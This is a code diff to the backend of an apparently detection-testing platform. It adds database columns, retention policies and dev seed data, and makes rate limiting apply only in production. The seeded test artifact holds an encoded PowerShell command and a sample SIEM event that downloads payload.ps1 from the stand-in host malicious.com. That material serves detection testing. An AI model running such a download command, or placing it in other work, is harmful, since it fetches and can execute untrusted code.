@@ -116,6 +116,28 @@ async def create_db_and_tables():
                     sync_conn.execute(text("ALTER TABLE environment_runner_configs ADD COLUMN runner_token_last_rotated_at DATETIME"))
                 if "runner_token_expires_at" not in runner_columns:
                     sync_conn.execute(text("ALTER TABLE environment_runner_configs ADD COLUMN runner_token_expires_at DATETIME"))
+                if "owner_name" not in runner_columns:
+                    sync_conn.execute(text("ALTER TABLE environment_runner_configs ADD COLUMN owner_name VARCHAR(255)"))
+                if "owner_email" not in runner_columns:
+                    sync_conn.execute(text("ALTER TABLE environment_runner_configs ADD COLUMN owner_email VARCHAR(255)"))
+                ai_columns = {col["name"] for col in inspector.get_columns("ai_assistant_settings")}
+                if "analysis_mode" not in ai_columns:
+                    sync_conn.execute(text("ALTER TABLE ai_assistant_settings ADD COLUMN analysis_mode VARCHAR(50)"))
+                policy_columns = {col["name"] for col in inspector.get_columns("testing_policies")}
+                if "test_data_retention_days" not in policy_columns:
+                    sync_conn.execute(text("ALTER TABLE testing_policies ADD COLUMN test_data_retention_days INTEGER DEFAULT 90"))
+                if "retention_pass_days_lab" not in policy_columns:
+                    sync_conn.execute(text("ALTER TABLE testing_policies ADD COLUMN retention_pass_days_lab INTEGER DEFAULT 7"))
+                if "retention_fail_days_lab" not in policy_columns:
+                    sync_conn.execute(text("ALTER TABLE testing_policies ADD COLUMN retention_fail_days_lab INTEGER DEFAULT 30"))
+                if "retention_pass_days_dev" not in policy_columns:
+                    sync_conn.execute(text("ALTER TABLE testing_policies ADD COLUMN retention_pass_days_dev INTEGER DEFAULT 30"))
+                if "retention_fail_days_dev" not in policy_columns:
+                    sync_conn.execute(text("ALTER TABLE testing_policies ADD COLUMN retention_fail_days_dev INTEGER DEFAULT 90"))
+                if "retention_pass_days_prod" not in policy_columns:
+                    sync_conn.execute(text("ALTER TABLE testing_policies ADD COLUMN retention_pass_days_prod INTEGER DEFAULT 90"))
+                if "retention_fail_days_prod" not in policy_columns:
+                    sync_conn.execute(text("ALTER TABLE testing_policies ADD COLUMN retention_fail_days_prod INTEGER DEFAULT 180"))
                 # Backfill runner org_id for legacy rows
                 sync_conn.execute(text(
                     "UPDATE environment_runner_configs SET organization_id = (SELECT id FROM organizations LIMIT 1) "
@@ -307,6 +329,52 @@ async def create_db_and_tables():
                         sample_technique_id,
                         org.id,
                     )
+                
+                # Seed a sample test + artifact for the default org if none exist (dev convenience)
+                tests_result = await session.execute(
+                    select(models.Test).where(models.Test.organization_id == org.id)
+                )
+                if not tests_result.scalars().first():
+                    # Grab the sample detection to attach the test to.
+                    detection_result = await session.execute(
+                        select(models.Detection).where(models.Detection.organization_id == org.id).limit(1)
+                    )
+                    sample_det = detection_result.scalars().first()
+                    if sample_det:
+                        from datetime import datetime, timedelta
+                        sample_test = models.Test(
+                            organization_id=org.id,
+                            detection_id=sample_det.id,
+                            technique_id=sample_det.technique_id,
+                            marker="purvex_sample_test_20260125",
+                            environment="lab",
+                            status="completed",
+                            result="PASS",
+                            score=85,
+                            started_at=datetime.utcnow() - timedelta(hours=2),
+                            finished_at=datetime.utcnow() - timedelta(hours=1),
+                            initiated_by_user_id=admin.id if admin else None,
+                            initiated_by_email=admin.email if admin else None,
+                            initiated_by_username=admin.username if admin else None,
+                        )
+                        session.add(sample_test)
+                        await session.flush()
+
+                        sample_artifact = models.TestArtifact(
+                            organization_id=org.id,
+                            test_id=sample_test.id,
+                            atomic_command="powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==",
+                            siem_sample_events='''[{"EventCode":4104,"host":"LAB-DC01","user":"SYSTEM","ScriptBlockText":"Invoke-WebRequest -Uri http://malicious.com/payload.ps1 -OutFile C:\\\\temp\\\\payload.ps1","timestamp":"2026-01-25T10:30:00Z"}]''',
+                            ai_explanation="Detection successfully fired on suspicious PowerShell execution with encoded command. Telemetry was present and the rule logic correctly identified the attack pattern.",
+                            ai_root_cause_category="NONE",
+                            ai_confidence_score=90,
+                        )
+                        session.add(sample_artifact)
+                        sample_det.last_tested_at = sample_test.finished_at
+                        sample_det.last_pass_at = sample_test.finished_at
+                        sample_det.last_alert_at = sample_test.finished_at
+                        await session.commit()
+                        logger.info("Seeded sample test and artifact for org %s", org.id)
 
                 # Normalize legacy sample detection metadata (one-time fix for dev data)
                 legacy_result = await session.execute(
@@ -410,7 +478,8 @@ IS_PRODUCTION = settings.DEPLOYMENT_ENV.lower() == "prod"
 
 # Security middleware (add first, processes responses last)
 app.add_middleware(SecurityHeadersMiddleware)
-app.add_middleware(RateLimitMiddleware, max_requests=100, window_seconds=60)
+if os.getenv("PURVEX_ENV", "dev").lower() == "prod":
+    app.add_middleware(RateLimitMiddleware, max_requests=100, window_seconds=60)
 app.add_middleware(RequestLoggingMiddleware)
 
 # Production security middleware
